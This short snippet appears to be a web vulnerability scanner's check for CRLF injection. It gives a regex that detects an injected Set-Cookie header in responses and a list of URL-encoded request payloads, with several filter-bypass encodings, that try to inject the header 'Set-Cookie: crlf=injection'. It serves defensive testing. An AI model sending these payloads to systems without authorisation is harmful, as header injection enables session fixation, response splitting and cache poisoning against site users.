### CRLF Injection

#### Regexp 'Detect in response':
```
(?m)^Set-Cookie: crlf=injection
```


#### request payloads:

```
/%%0a0aSet-Cookie:crlf=injection
/%0aSet-Cookie:crlf=injection
/%0d%0aSet-Cookie:crlf=injection
/%0dSet-Cookie:crlf=injection
/%23%0aSet-Cookie:crlf=injection
/%23%0d%0aSet-Cookie:crlf=injection
/%23%0dSet-Cookie:crlf=injection
/%25%30%61Set-Cookie:crlf=injection
/%25%30aSet-Cookie:crlf=injection
/%250aSet-Cookie:crlf=injection
/%25250aSet-Cookie:crlf=injection
/%2e%2e%2f%0d%0aSet-Cookie:crlf=injection
/%2f%2e%2e%0d%0aSet-Cookie:crlf=injection
/%2F..%0d%0aSet-Cookie:crlf=injection
/%3f%0d%0aSet-Cookie:crlf=injection
/%3f%0dSet-Cookie:crlf=injection
/%u000aSet-Cookie:crlf=injection
```
